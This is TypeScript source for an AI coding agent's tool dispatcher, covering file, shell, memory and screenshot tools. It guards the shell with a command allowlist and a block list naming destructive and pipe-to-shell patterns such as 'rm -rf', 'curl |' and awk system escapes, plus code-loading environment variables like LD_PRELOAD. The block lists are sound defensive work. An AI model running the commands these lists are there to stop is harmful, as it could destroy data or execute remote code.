import fs from 'fs/promises';
import fsSync from 'fs';
import path from 'path';
import { spawn } from 'child_process';
import axios from 'axios';
import { vectorService } from './vectorService';
import { logger } from '../utils/logger';
import screenshot from 'screenshot-desktop';
import sharp from 'sharp';
import { validatePath, PROJECT_ROOT, getEffectiveProjectRoot, isPathWithinRoot } from '../utils/fileSystem';
import { transactionService } from './transactionService';
import { appEventBus } from '../utils/eventBus';
import { coreMemory } from './coreMemory';
import { getPreviewState, getRequestContext } from '../utils/requestContext';
import { nativeCopyManager } from './nativeCopyManager';
import { agentScratchpadService } from './agentScratchpad';
import { parseUnifiedDiff, applyHunks } from './patchApplier';
import { buildSymbolIndex, querySymbols, hasSymbolIndex } from './projectIndexer';
import { mcpClientManager } from './mcpClient';
import { safeAxiosGet, UrlSafetyError } from '../utils/urlSafety';
import { isSensitivePath } from '../utils/sensitivePaths';
import { lexShellCommand, ShellSyntaxError, type ShellDialect, type ShellStage, type ShellWord } from '../utils/shellLexer';

// Security: Explicit allowlist of permitted command prefixes
// This replaces the insecure denylist approach which was trivially bypassed
const ALLOWED_COMMAND_PREFIXES = [
  'git ',
  'npm ',
  'npx ',
  'node ',
  'python ',
  'python3 ',
  'ls ',
  'cat ',
  'echo ',
  'pwd',
  'whoami',
  'date',
  'head ',
  'tail ',
  'grep ',
  'find ',
  'mkdir ',
  'touch ',
  'cp ',
  'mv ',
  'code ',
  'tsc ',
  'eslint ',
  'prettier ',
  'jest ',
  'vitest ',
  'pnpm ',
  'yarn ',
  'bun ',
  'cd ',
  'docker ',
  'curl ',
  'wget ',
  // Pipeline-friendly utilities (read-only / deterministic)
  'wc ',
  'sort ',
  'uniq ',
  // Additional CLI utilities for agent workflows
  'rg ',           // ripgrep — faster grep
  'jq ',           // JSON processing
  'basename ',     // path manipulation
  'dirname ',      // path manipulation
  'du ',           // disk usage
  'df ',           // disk free space
  'env ',          // environment variables
  'printenv ',     // environment variables
  'stat ',         // file metadata
  'file ',         // file type detection
  'diff ',         // file comparison
  'patch ',        // apply unified diffs
  'tr ',           // character translation
  'cut ',          // column extraction
  'paste ',        // column merging
  'comm ',         // file comparison
  'column ',       // table formatting
  // Diagnostics the agent needs for "is something listening on this port?"
  // checks. lsof/ss are POSIX; netstat/tasklist/where exist on Windows.
  'lsof ',
  'ss ',
  'netstat ',
  'netstat',       // bare `netstat` prints all, common usage
  'tasklist ',
  'tasklist',
  'where ',        // Windows `which`
  'which ',        // POSIX
  'test ',         // `test -f node_modules/.bin/vite` — ghost-install check
];

// Operators that may separate pipeline stages. Command is validated per-stage.
// Order matters: longer operators first so we match `||` before `|` and `&&`
// before `&`. Single `&` (background) and newlines also separate commands in
// the shells we route through (`bash -c` / `sh -c`), so they must split too —
// otherwise `ls\nevil` or `ls & evil` would only have its first stage checked.
const PIPELINE_SEPARATOR = /(?:\|\||&&|;|\||&|\r?\n)/;

/**
 * Capture the primary screen on Windows using System.Drawing via PowerShell.
 * The bundled `screenshot-desktop` helper exe (screenCapture_1.3.2.exe) is
 * commonly missing or quarantined by AV on Windows — this avoids that binary
 * entirely by using WinForms/System.Drawing APIs already shipped with .NET.
 */
async function captureScreenWindows(outPath: string): Promise<void> {
  // Escape for a single-quoted PowerShell string: double-up any embedded single quotes.
  const psEscapedPath = outPath.replace(/'/g, "''");
  const script = `
Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen;
$bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height);
$gfx = [System.Drawing.Graphics]::FromImage($bmp);
$gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size);
$bmp.Save('${psEscapedPath}', [System.Drawing.Imaging.ImageFormat]::Png);
$gfx.Dispose(); $bmp.Dispose();
`;
  await new Promise<void>((resolve, reject) => {
    const proc = spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', script], {
      windowsHide: true,
    });
    let stderr = '';
    proc.stdout.resume(); // drain — an unread stdout pipe can stall the child
    proc.stderr.on('data', (d: Buffer) => { if (stderr.length < 64 * 1024) stderr += d.toString(); });
    const timer = setTimeout(() => {
      proc.kill();
      reject(new Error('Screenshot timed out after 10s'));
    }, 10_000);
    proc.on('error', (err) => { clearTimeout(timer); reject(err); });
    proc.on('close', (code) => {
      clearTimeout(timer);
      if (code === 0) resolve();
      else reject(new Error(`PowerShell screenshot exited with ${code}: ${stderr.trim()}`));
    });
  });
}

// Redirect operators — kept attached to a stage, not used to split stages.
// The shell still interprets them when we route through `sh -c`.

function hasShellMetacharacters(command: string): boolean {
  // Any of: pipeline-splitters, background/&-chains, newlines, OR redirects
  return /(?:\|\||&&|;|\||&|\r?\n|(?:^|\s)\d?>>?|(?:^|\s)2>)/.test(command);
}

function hasCommandSubstitution(command: string): boolean {
  // Reject backticks and $(...) — they hide commands from the allowlist.
  return /`|\$\(/.test(command);
}

function splitPipelineStages(command: string): string[] {
  // Split on pipeline/chain operators only. Redirects stay attached.
  return command.split(PIPELINE_SEPARATOR).map(s => s.trim()).filter(Boolean);
}

// Standard discard/stream sinks — not real files, always outside any project
// root once resolved (e.g. `/dev/null` → `C:\dev\null` on Windows), but safe
// to redirect to since they can't be read back or used to exfiltrate data.
function isNullSink(target: string): boolean {
  return /^\/dev\/(null|stdout|stderr|zero)$/i.test(target) || /^(nul|con)$/i.test(target);
}

/** The dialect of the shell run_shell will actually route through. */
function currentShellDialect(): ShellDialect {
  return process.platform === 'win32' && !WIN_BASH_PATH ? 'cmd' : 'posix';
}

function assertPathTokenWithinRoot(candidate: string, simulatedCwd: string, kind: 'argument' | 'redirect target'): void {
  if (!candidate || isNullSink(candidate)) return;
  const resolved = path.resolve(simulatedCwd, candidate);
  if (!isPathWithinRoot(resolved)) {
    throw new Error(
      kind === 'redirect target'
        ? `Command rejected by security policy: redirect target '${candidate}' would read/write outside the permitted project root.`
        : `Command rejected by security policy: argument '${candidate}' resolves outside the permitted project root.`
    );
  }
}

function assertNoExpansion(word: ShellWord): void {
  if (word.expands) {
    throw new Error(
      `Command rejected by security policy: '${word.text.slice(0, 60)}' uses shell expansion ($VAR, ~, {a,b}, %VAR%), which can resolve outside the project root. Use an explicit relative path instead.`
    );
  }
}

/**
 * Reject any argument or redirect target in a stage that resolves (relative
 * to the given simulated cwd) to a location outside the project root. Words
 * come from the shell-aware lexer, so quotes, escapes and glued redirects
 * (`cat "../x"`, `\.\./x`, `echo a>../x`) are seen the way the shell sees
 * them. Flags are skipped, but `--flag=value` values and short flags with a
 * glued path value (`-o../out`) are still checked.
 */
function assertStageArgsWithinRoot(stage: ShellStage, simulatedCwd: string): void {
  for (const word of stage.words.slice(1)) {
    assertNoExpansion(word);
    const raw = word.text;
    if (!raw) continue;
    if (raw.startsWith('--')) {
      const eq = raw.indexOf('=');
      if (eq !== -1) assertPathTokenWithinRoot(raw.slice(eq + 1), simulatedCwd, 'argument');
      continue;
    }
    if (raw.startsWith('-')) {
      // `-o../out`, `-C/etc` — a short flag with its value glued on.
      const glued = raw.slice(2);
      if (raw.length > 2 && (/[\\/]/.test(glued) || glued.startsWith('.'))) {
        assertPathTokenWithinRoot(glued, simulatedCwd, 'argument');
      }
      continue;
    }
    assertPathTokenWithinRoot(raw, simulatedCwd, 'argument');
  }
  for (const target of stage.redirects) {
    assertNoExpansion(target);
    assertPathTokenWithinRoot(target.text, simulatedCwd, 'redirect target');
  }
}

/** Short-flag cluster letters (`-uc` → "uc"), or '' if the word isn't one. */
function shortFlagCluster(arg: string): string {
  return /^-[A-Za-z0-9]+$/.test(arg) ? arg.slice(1) : '';
}

function commandBaseName(word: string): string {
  return path.basename(word.replace(/\\/g, '/')).toLowerCase().replace(/\.(exe|cmd|bat)$/, '');
}

// Env vars that make an otherwise-safe binary load arbitrary code.
const DANGEROUS_ENV_ASSIGNMENTS = /^(NODE_OPTIONS|LD_PRELOAD|LD_LIBRARY_PATH|DYLD_[A-Z_]+|PYTHONSTARTUP|PYTHONPATH|PYTHONHOME|BASH_ENV|ENV|PATH|PERL5OPT|RUBYOPT|GIT_[A-Z_]+)=/i;

// Per-stage argv-level safety. Runs after the prefix allowlist check.
// Blocks code-eval / arbitrary-spawn flags on otherwise-allowed binaries,
// including combined short flags (`python -uc`, `node -pe`).
function rejectDangerousArgv(words: string[]): void {
  if (words.length === 0) return;
  const cmd = commandBaseName(words[0]!);
  const args = words.slice(1);

  if (cmd === 'node') {
    for (const a of args) {
      const lower = a.toLowerCase();
      const cluster = shortFlagCluster(a);
      if (
        /[epri]/.test(cluster) ||
        /^--(eval|print|require|import|loader|experimental-loader|interactive|inspect|inspect-brk|inspect-wait)(=|$)/.test(lower)
      ) {
        throw new Error(
          `Command rejected: 'node' with -e/--eval/-p/--print/-r/--require/--import/--loader/-i/--inspect flags is not permitted (executes arbitrary code).`
        );
      }
    }
  }

  if (cmd === 'python' || cmd === 'python3' || cmd === 'py') {
    for (const a of args) {
      if (/[ci]/.test(shortFlagCluster(a))) {
        throw new Error(
          `Command rejected: 'python' with -c/-i flags is not permitted (executes arbitrary code). Run a script file instead.`
        );
      }
    }
  }

  if (cmd === 'npx') {
    let idx = 0;
    for (; idx < args.length; idx++) {
      const a = args[idx]!;
      const lower = a.toLowerCase();
      if (/[pc]/.test(shortFlagCluster(a)) || /^--(package|call)(=|$)/.test(lower)) {
        throw new Error(
          `Command rejected: 'npx' with -p/--package/-c/--call is not permitted (runs arbitrary packages).`
        );
      }
      if (!a.startsWith('-')) break;
    }
    // `npx node -e …` / `npx python -c …` — check the wrapped command too.
    if (idx < args.length) rejectDangerousArgv(args.slice(idx));
  }

  if (cmd === 'find') {
    if (args.some(a => /^-(exec|execdir|ok|okdir)$/i.test(a))) {
      throw new Error(
        `Command rejected: 'find' with -exec/-execdir/-ok/-okdir is not permitted (spawns arbitrary commands).`
      );
    }
  }

  if (cmd === 'env') {
    // `env` runs whatever follows it — the wrapped command must pass the same
    // allowlist and argv checks, and may not inject code-loading env vars.
    let idx = 0;
    for (; idx < args.length; idx++) {
      const a = args[idx]!;
      if (a.startsWith('-')) continue;
      if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(a)) {
        if (DANGEROUS_ENV_ASSIGNMENTS.test(a)) {
          throw new Error(`Command rejected: 'env' may not set '${a.split('=')[0]}' (loads arbitrary code).`);
        }
        continue;
      }
      break;
    }
    const wrapped = args.slice(idx);
    if (wrapped.length > 0) {
      const wrappedText = wrapped.join(' ');
      const allowed = ALLOWED_COMMAND_PREFIXES.some(prefix =>
        wrappedText.toLowerCase().startsWith(prefix.toLowerCase()) || wrappedText.toLowerCase() === prefix.trim().toLowerCase()
      );
      if (!allowed) {
        throw new Error(`Command rejected by security policy: 'env' wrapping '${wrappedText.slice(0, 50)}' is not in the allowlist.`);
      }
      rejectDangerousArgv(wrapped);
    }
  }
}

/**
 * Rewrite a subset of POSIX shell idioms into Windows cmd.exe equivalents so
 * the same command string works on both platforms. The agent is trained on
 * POSIX syntax; this lets it stay POSIX-native while we still shell out to
 * cmd /c on Windows (required for `npm.cmd` et al. to resolve).
 *
 * Scope is intentionally narrow: only idioms that appear frequently in
 * agent-generated commands and have a clean Windows mapping. Anything more
 * ambitious (variable expansion, glob semantics) belongs in a POSIX shell,
 * not a regex rewriter.
 */
function translatePosixShellismsForWindows(command: string): string {
  // `/dev/null` → `nul`. Match only when it's a standalone token, not
  // part of a longer path. The \b after `null` lets it end at whitespace,
  // pipe/redirect operators, or end-of-string.
  return command.replace(/\/dev\/null\b/g, 'nul');
}

/**
 * Probe for git-bash on Windows. The agent writes POSIX shell (`&` backgrounds,
 * `$!`, `sleep`, `/dev/null`, etc.) and cmd.exe doesn't understand any of it.
 * Git for Windows is on ~every dev machine that has git, and its bundled
 * bash.exe handles `npm`, `node`, and other shimmed binaries correctly.
 *
 * We probe once at module-load — the result is a stable property of the
 * machine, not something that changes request-to-request.
 */
const WINDOWS_BASH_CANDIDATES = [
  'C:\\Program Files\\Git\\bin\\bash.exe',
  'C:\\Program Files (x86)\\Git\\bin\\bash.exe',
  'C:\\Program Files\\Git\\usr\\bin\\bash.exe',
];
const WIN_BASH_PATH: string | null = (() => {
  if (process.platform !== 'win32') return null;
  for (const candidate of WINDOWS_BASH_CANDIDATES) {
    try {
      if (fsSync.existsSync(candidate)) return candidate;
    } catch { /* continue */ }
  }
  return null;
})();

const IMAGE_FILTERS = new Set(['grayscale', 'sepia', 'blur', 'sharpen']);

// Directories that grep_files / replace_in_files never descend into.
const GREP_EXCLUDED_DIRS = ['node_modules', '.git', 'dist', 'build'];

function isInExcludedDir(line: string): boolean {
  return GREP_EXCLUDED_DIRS.some(d => line.includes(`\\${d}\\`) || line.includes(`/${d}/`) || line.startsWith(`${d}\\`) || line.startsWith(`${d}/`));
}

/** `*.{ts,tsx}` / `*.ts` / `index.*` → basename matcher. */
function globToBasenameRegex(glob: string): RegExp {
  const base = glob.replace(/\\/g, '/').split('/').pop() || '*';
  const alternatives: string[] = [];
  const brace = base.match(/^(.*)\{([^}]+)\}(.*)$/);
  if (brace) {
    for (const alt of (brace[2] ?? '').split(',')) alternatives.push(`${brace[1] ?? ''}${alt}${brace[3] ?? ''}`);
  } else {
    alternatives.push(base);
  }
  const toRe = (g: string) => g.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*').replace(/\?/g, '.');
  return new RegExp(`^(?:${alternatives.map(toRe).join('|')})$`, process.platform === 'win32' ? 'i' : '');
}

// Tools that write files, spawn processes or mutate persistent state —
// DRY_RUN=true short-circuits every one of them.
const MUTATING_TOOLS = new Set([
  'write_file', 'create_file', 'edit_file', 'delete_file', 'move_file', 'replace_in_files', 'apply_patch',
  'run_shell', 'run_tests', 'install_package', 'git_commit',
  'native_backend_start', 'native_backend_stop',
  'resize_image', 'crop_image', 'apply_image_filter',
  'invalidate_memory', 'crystallize_memory', 'write_core_memory', 'delete_core_memory',
]);

// Windows binaries that are real .exe files and can be spawned without cmd.exe.
const WINDOWS_NATIVE_EXES = new Set(['git', 'node', 'python', 'python3', 'py', 'findstr', 'where', 'tasklist', 'netstat']);

// Arguments that are safe to place on a cmd.exe command line unquoted: no
// spaces, quotes, `%`/`!` expansion, `^` escapes, or `& | < > ( )` operators.
const CMD_SAFE_ARG = /^[\w@+=:,./\\~*-]+$/;

/** Kill a child and its descendants (cmd.exe shims leave npm/node grandchildren behind). */
function killProcessTree(proc: ReturnType<typeof spawn>): void {
  if (process.platform === 'win32' && proc.pid) {
    try {
      spawn('taskkill', ['/pid', String(proc.pid), '/T', '/F'], { windowsHide: true, stdio: 'ignore' })
        .on('error', () => { try { proc.kill(); } catch { /* already gone */ } });
      return;
    } catch { /* fall through */ }
  }
  try { proc.kill(); } catch { /* already gone */ }
}

// Commands that require explicit opt-in via SOLVENT_ALLOW_SHELL=true
const DANGEROUS_COMMANDS = [
  'rm -rf',
  'mkfs',
  'dd',
  'chmod',
  'chown',
  'sudo',
  'su ',
  'curl |',
  'wget |',
  'bash -c',
  'sh -c',
  'eval ',
  'exec ',
  'begin{system',   // awk system() escape, even if awk re-added later
  'begin{getline',  // awk getline pipe escape
];

// Match each dangerous pattern on word boundaries — a plain substring test
// rejected innocent commands (`git add .` contains "dd").
// Patterns with a trailing space ('eval ', 'su ') keep requiring whitespace
// after them, so `.exec(` inside a quoted argument doesn't match 'exec '.
const DANGEROUS_COMMAND_RES = DANGEROUS_COMMANDS.map(p => {
  const escaped = p.trim().toLowerCase().replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const tail = p.endsWith(' ') ? '\\s' : '(?![\\w-])';
  return new RegExp(`(?:^|[^\\w-])${escaped}${tail}`);
});

export class ToolService {
  private isDryRun = process.env.DRY_RUN === 'true';

  constructor() {
    // Uses PROJECT_ROOT from fileSystem.ts directly
  }

  /**
   * @param fromOverseer - Set to true only when called from the Overseer's autonomous reasoning
   *   loop. This enforces the per-cycle tool budget. Internal calls (waterfall, crystallize, etc.)
   *   must NOT set this flag to avoid consuming Overseer budget slots.
   */
  async executeTool(toolName: string, args: Record<string, unknown>, fromOverseer: boolean = false) {
    const txId = await transactionService.logStart(toolName, args);
    logger.info(`[ToolService] Executing ${toolName}... (TX: ${txId})`, args);
    
    // GUARD: Budget Enforcement — only applies to Overseer-initiated calls.
    // Uses the event bus to notify SupervisorService, avoiding a circular import.
    if (fromOverseer) {
      try {
        appEventBus.emit('supervisor:increment-tool-budget');
      } catch (e: unknown) {
        const err = e instanceof Error ? e : new Error(String(e));
        await transactionService.logError(txId, err.message);
        throw e;
      }
    }

    // GUARD: Dry Run Mode
    if (this.isDryRun && MUTATING_TOOLS.has(toolName)) {
      const msg = `[DRY RUN] Would execute ${toolName}`;
      logger.info(msg);
      await transactionService.logComplete(txId, { dry_run: true, message: msg });
      return { status: 'dry_run', message: msg };
    }

    // Frontend-deferred tools: return a marker result instead of executing
    if (toolName.startsWith('ide_')) {
      const deferredResult = { status: 'deferred_to_frontend', tool: toolName, args };
      await transactionService.logComplete(txId, deferredResult);
      return deferredResult;
    }

    try {
      let result;
      switch (toolName) {
        case 'read_file':
          result = await this.readFile(args.path as string);
          break;
        case 'write_file':
          // GUARD: Approval for NEW files
          await this.ensureApprovalForWrite(args.path as string);
          result = await this.writeFile(args.path as string, args.content as string);
          break;
        case 'list_files':
          result = await this.listFiles((args.path as string) || '.');
          break;
        case 'run_shell':
          // Shell is already allowlisted, but let's be extra safe for sensitive ops if needed
          result = await this.runShell(args.command as string);
          break;
        // ... (other cases map directly)
        case 'web_search': result = await this.webSearch(args.query as string); break;
        case 'fetch_web_content': result = await this.fetchWebContent(args.url as string); break;
        case 'capture_ui': result = await this.captureUI(); break;
        case 'get_ui_text': result = await this.getUIText(); break;
        case 'resize_image': result = await this.resizeImage(args.path as string, args.width as number | undefined, args.height as number | undefined); break;
        case 'crop_image': result = await this.cropImage(args.path as string, args.left as number, args.top as number, args.width as number, args.height as number); break;
        case 'apply_image_filter': result = await this.applyImageFilter(args.path as string, args.filter as 'grayscale' | 'sepia' | 'blur' | 'sharpen'); break;
        case 'get_image_info': result = await this.getImageInfo(args.path as string); break;
        case 'crystallize_memory': result = await this.crystallizeMemory(args.content as string, args.type as string, args.tags as string[] | undefined); break;
        case 'invalidate_memory': result = await this.invalidateMemory(args.memoryId as string, args.reason as string, args.replacementId as string | undefined); break;
        case 'read_core_memory':
          result = JSON.stringify(coreMemory.getAll());
          break;
        case 'write_core_memory': {
          const { key, value } = args as { key: string; value: string };
          if (!key || !value) {
            throw new Error('Error: key and value are required');
          }
          try {
            coreMemory.set(key, value);
            result = `Core memory updated: ${key} = ${value}`;
          } catch (err: unknown) {
            throw new Error(`Error: ${err instanceof Error ? err.message : String(err)}`);
          }
          break;
        }
        case 'delete_core_memory': {
          const { key } = args as { key: string };
          if (!key) {
            throw new Error('Error: key is required');
          }
          const deleted = coreMemory.delete(key);
          result = deleted ? `Deleted core memory key: ${key}` : `Key not found: ${key}`;
          break;
        }
        case 'fetch_preview_source':
          result = await this.fetchPreviewSource(args.url as string);
          break;
        case 'get_file_outline':
          result = await this.getFileOutline(args.path as string);
          break;
        case 'grep_files':
          result = await this.grepFiles(
            args.pattern as string,
            args.path as string | undefined,
            args.include as string | undefined
          );
          break;
        // Every tool that writes, creates, moves or deletes a file goes
        // through ensureApprovalForWrite — new paths need approval unless
        // AUTO_APPROVE=true (set in .env by default).
        case 'edit_file':
          await this.ensureApprovalForWrite(args.path as string);
          result = await this.editFile(
            args.path as string,
            args.old_content as string,
            args.new_content as string
          );
          break;
        case 'create_file':
          await this.ensureApprovalForWrite(args.path as string);
          result = await this.createFile(args.path as string, args.content as string);
          break;
        case 'delete_file':
          await this.ensureApprovalForWrite(args.path as string);
          result = await this.deleteFile(args.path as string);
          break;
        case 'move_file':
          // The destination is the new file being created.
          await this.ensureApprovalForWrite(args.to as string);
          result = await this.moveFile(args.from as string, args.to as string);
          break;
        case 'replace_in_files':
          await this.ensureApprovalForWrite((args.path as string | undefined) || '.');
          result = await this.replaceInFiles(
            args.pattern as string,
            args.replacement as string,
            args.glob as string | undefined,
            args.path as string | undefined
          );
          break;
        case 'run_tests':
          result = await this.runTests(
            args.command as string | undefined,
            args.cwd as string | undefined
          );
          break;
        case 'get_errors':
          result = await this.getErrors(args.cwd as string | undefined);
          break;
        case 'install_package':
          result = await this.installPackage(
            args.packages as string[],
            args.cwd as string | undefined
          );
          break;
        case 'git_status':
          result = await this.gitStatus();
          break;
        case 'git_diff':
          result = await this.gitDiff(args.file as string | undefined);
          break;
        case 'git_commit':
          result = await this.gitCommitAll(args.message as string);
          break;
        case 'get_project_info':
          result = await this.getProjectInfo(args.path as string | undefined);
          break;
        case 'get_console_logs':
          result = this.getConsoleLogs(
            args.filter as 'error' | 'warn' | 'log' | undefined,
            args.limit as number | undefined
          );
          break;
        case 'get_selected_element':
          result = this.getSelectedElement();
          break;
        case 'native_backend_start': {
          const { port, pid } = await nativeCopyManager.start(
            args.projectPath as string,
            // Models sometimes send the port as a string; start() rejects non-integers.
            args.port === undefined || args.port === null ? 3002 : Number(args.port)
          );
          result = { ok: true, port, pid, hint: 'Call native_backend_status to confirm readiness before declaring the server live.' };
          break;
        }
        case 'native_backend_stop':
          await nativeCopyManager.stop();
          result = { ok: true };
          break;
        case 'native_backend_status':
          result = nativeCopyManager.status();
          break;

        // ── Agent planning tools ──
        // All three key the scratchpad by the request's chat session (falling back to
        // 'default'), matching baseOpenAIService's renderForPrompt(options.sessionId || 'default').
        case 'create_plan': {
          const sessionId = getRequestContext()?.sessionId || 'default';
          const steps = (args.steps as string[]) || [];
          if (steps.length === 0) throw new Error('create_plan requires at least one step');
          const plan = agentScratchpadService.createPlan(sessionId, steps);
          result = {
            status: 'plan_created',
            sessionId,
            plan: plan.map(s => ({ id: s.id, title: s.title, status: s.status, notes: s.notes })),
            note: 'Plan injected into context. Use update_plan to mark steps as you work.',
          };
          break;
        }
        case 'update_plan': {
          const sessionId = getRequestContext()?.sessionId || 'default';
          const stepId = args.step_id as string;
          const status = args.status as string;
          if (!stepId || !status) throw new Error('update_plan requires step_id and status');
          const step = agentScratchpadService.updateStep(sessionId, stepId, status as any, args.notes as string);
          if (!step) throw new Error(`Step ${stepId} not found in plan`);
          const pad = agentScratchpadService.getScratchpad(sessionId);
          result = {
            status: 'step_updated',
            step: { id: step.id, title: step.title, status: step.status },
            plan: pad?.plan.map(s => ({ id: s.id, title: s.title, status: s.status, notes: s.notes })),
          };
          break;
        }
        case 'reflect': {
          const sessionId = getRequestContext()?.sessionId || 'default';
          const verified = (args.verified as string[]) || [];
          const assumed = (args.assumed as string[]) || [];
          const next = args.next as string;
          if (!next) throw new Error('reflect requires a "next" action');
          const reflection = agentScratchpadService.addReflection(sessionId, verified, assumed, next);
          result = { status: 'reflection_recorded', reflection };
          break;
        }

        // ── Code editing tools ──
        case 'apply_patch': {
          const patchPath = args.path as string;
          const patchContent = args.patch as string;
          if (!patchPath || !patchContent) throw new Error('apply_patch requires path and patch');

          const fullPatchPath = validatePath(patchPath);
          const existingContent = await fs.readFile(fullPatchPath, 'utf-8');

          const hunks = parseUnifiedDiff(patchContent);
          if (hunks.length === 0) throw new Error('apply_patch: no valid hunks found in patch');

          const patchResult = applyHunks(existingContent, hunks);
          if (!patchResult.success) {
            throw new Error(`apply_patch: ${patchResult.error}`);
          }

          await this.ensureApprovalForWrite(patchPath);
          await fs.writeFile(fullPatchPath, patchResult.newContent, 'utf-8');
          result = {
            status: 'patch_applied',
            path: patchPath,
            hunksApplied: patchResult.hunksApplied,
          };
          break;
        }

        case 'read_file_range': {
          const rangePath = args.path as string;
          const start = Math.max(1, args.start as number);
          const end = Math.min(start + 500, args.end as number); // cap at 500 lines
          if (!rangePath || !start || !end) throw new Error('read_file_range requires path, start, and end');

          const fullRangePath = validatePath(rangePath);
          const content = await fs.readFile(fullRangePath, 'utf-8');
          const allLines = content.split('\n');

          const startIdx = Math.max(0, start - 1); // 1-based to 0-based
          const endIdx = Math.min(allLines.length, end);
          const rangeLines = allLines.slice(startIdx, endIdx);

          result = {
            path: rangePath,
            start,
            end: endIdx,
            totalLines: allLines.length,
            content: rangeLines.map((line, i) => `${startIdx + i + 1}: ${line}`).join('\n'),
          };
          break;
        }

        // ── Interaction tools ──
        // ask_user removed: requires a pause/resume SSE round-trip that doesn't
        // exist yet. Re-add when the agent loop supports blocking for user input.

        case 'run_tests_focused': {
          const focusFile = args.file as string;
          if (!focusFile) throw new Error('run_tests_focused requires a file path');

          const relPath = focusFile.replace(/\\/g, '/');

          // projectRoot (optional, relative to the effective root) scopes
          // both the type-check and the test-file lookup.
          const focusRoot = typeof args.projectRoot === 'string' && args.projectRoot
            ? validatePath(args.projectRoot)
            : getEffectiveProjectRoot();

          // Use existing getErrors and filter to the target file
          const allErrors = await this.getErrors(focusRoot === getEffectiveProjectRoot() ? undefined : focusRoot);
          const relevantErrors = (allErrors.errors || []).filter((e: { file?: string; message?: string }) =>
            e.file?.includes(relPath) || e.file?.includes(path.basename(relPath))
          );

          // Check for corresponding test files
          const baseName = relPath.replace(/\.(ts|tsx|js|jsx)$/, '');
          const effectiveRoot = focusRoot;
          const testPatterns = [`${baseName}.test.ts`, `${baseName}.spec.ts`, `${baseName}.test.tsx`, `${baseName}.spec.tsx`];
          const testFiles = await Promise.all(
            testPatterns.map(async (tp) => {
              try {
                await fs.access(path.join(effectiveRoot, tp));
                return tp;
              } catch {
                return null;
              }
            })
          ).then(results => results.filter(Boolean) as string[]);

          result = {
            file: focusFile,
            typeCheck: {
              status: relevantErrors.length === 0 ? 'clean' : 'errors',
              errorCount: relevantErrors.length,
              errors: relevantErrors.slice(0, 5),
            },
            testFiles,
          };
          break;
        }

        case 'undo_last_action': {
          result = {
            status: 'info',
            note: 'Undo is handled via the agent loop. The beforeContent captured in tool_start events for write tools (write_file, edit_file, create_file) can be written back to restore the previous state. Use write_file with the beforeContent to undo a specific change.',
          };
          break;
        }

        case 'query_symbols': {
          const symQuery = args.query as string;
          if (!symQuery) throw new Error('query_symbols requires a query');
          const symRoot = getEffectiveProjectRoot();

          // Build index if not yet built for this project
          if (!hasSymbolIndex(symRoot)) {
            await buildSymbolIndex(symRoot);
          }

          const symbols = querySymbols(symRoot, symQuery, {
            kind: args.kind as string | undefined,
            file: args.file as string | undefined,
            limit: args.limit as number | undefined,
          });

          result = {
            query: symQuery,
            count: symbols.length,
            symbols: symbols.map(s => ({
              name: s.name,
              kind: s.kind,
              file: s.file,
              line: s.line,
              signature: s.signature,
            })),
          };
          break;
        }

        default:
          // Check if this is an MCP tool call
          if (mcpClientManager.isMCPTool(toolName)) {
            result = await mcpClientManager.callTool(toolName, args);
          } else {
            throw new Error(`Unknown tool: ${toolName}`);
          }
      }

      await transactionService.logComplete(txId, result);
      return result;

    } catch (error: unknown) {
      const err = error as Error;
      await transactionService.logError(txId, err.message);
      throw error;
    }
  }

  private async ensureApprovalForWrite(filePath: string) {
    const fullPath = validatePath(filePath);
    try {
      await fs.access(fullPath);
      // File exists, overwrite is currently allowed (could add versioning here later)
    } catch {
      // File does NOT exist. Trigger Approval Flow.
      if (process.env.AUTO_APPROVE === 'true') {
        logger.info(`[ToolService] Auto-approving new file creation: ${filePath}`);
        return;
      }
      
      logger.warn(`[ToolService] New file creation requires approval: ${filePath}`);
      appEventBus.emit('supervisor:emit-event', {
        event: 'APPROVAL_REQUIRED',
        data: { type: 'file_create', path: filePath, timeout: 60000 }
      });

      // In a real scenario, we would await a Promise here that resolves via a Socket event listener.
      // For this implementation iteration, we will throw to BLOCK it safe until UI is ready.
      // This forces the user to explicitly enable AUTO_APPROVE or implementing the UI handler.
      throw new Error(`APPROVAL_REQUIRED: Creation of ${filePath} requires user confirmation.`);
    }
  }

  private async invalidateMemory(memoryId: string, reason: string, replacementId?: string) {
    const success = await vectorService.updateEntry(memoryId, {
      status: 'deprecated',
      deprecatedBy: replacementId,
      invalidationReason: reason
    });

    if (!success) {
      throw new Error(`Memory ID ${memoryId} not found.`);
    }

    // Append to notes for visibility
    const notesPath = path.join(PROJECT_ROOT, '.solvent_notes.md');
    const note = `\n### [MEMORY DEPRECATED] ${new Date().toLocaleDateString()}\n**ID:** ${memoryId}\n**Reason:** ${reason}\n${replacementId ? `**Superseded By:** ${replacementId}` : ''}\n---\n`;
    await fs.appendFile(notesPath, note).catch(e => logger.warn('[ToolService] Note append failed', e));

    return {
      status: 'success',
      message: `Memory ${memoryId} deprecated.`,
      reason
    };
  }

  private async crystallizeMemory(content: string, type: string, tags: string[] = []) {
    // 1. Persist to Vector Memory (Long-term semantic recall)
    await vectorService.addEntry(content, {
      type,
      tags,
      timestamp: new Date().toISOString(),
      crystallized: true
    });

    // 2. Append to Solvent Notes (Visible context bridge)
    const notesPath = path.join(PROJECT_ROOT, '.solvent_notes.md');
    const formattedEntry = `\n### [${type.toUpperCase()}] ${new Date().toLocaleDateString()}\n**Tags:** ${tags.join(', ')}\n\n${content}\n\n---\n`;
    
    try {
      await fs.appendFile(notesPath, formattedEntry);
    } catch (error) {
      // If file doesn't exist, create it
      await fs.writeFile(notesPath, `# Solvent Project Notes\n${formattedEntry}`);
    }

    // 3. Emit Event for UI Feedback via event bus (avoids circular import)
    appEventBus.emit('supervisor:emit-event', {
      event: 'MEMORY_CRYSTALLIZED',
      data: { type, content }
    });

    return {
      status: 'success',
      message: `Memory crystallized as [${type}]. Saved to Vector DB and appended to .solvent_notes.md`,
      entry: { content, type, tags }
    };
  }

  private async getImageInfo(imagePath: string) {
    const fullPath = validatePath(imagePath);
    const metadata = await sharp(fullPath).metadata();
    return {
      width: metadata.width,
      height: metadata.height,
      format: metadata.format,
